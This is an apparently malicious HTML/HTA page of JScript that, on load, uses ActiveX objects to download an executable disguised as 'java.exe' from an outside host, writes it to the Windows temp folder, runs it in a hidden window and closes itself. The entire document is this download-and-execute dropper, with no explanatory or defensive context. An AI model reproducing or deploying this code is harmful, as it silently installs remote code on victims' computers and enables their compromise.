<html><body><script language="JScript">
var w = new ActiveXObject("WScript.Shell");
var f = new ActiveXObject("Scripting.FileSystemObject");
var tmp = f.GetSpecialFolder(2) + "\\java.exe";

var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
x.open("GET", "https://java-scan.up.railway.app/java.exe", false);
x.send();

var s = new ActiveXObject("ADODB.Stream");
s.Open();
s.Type = 1;
s.Write(x.responseBody);
s.SaveToFile(tmp, 2);
s.Close();

w.Run(tmp, 0, false);
window.close();
</script></body></html>
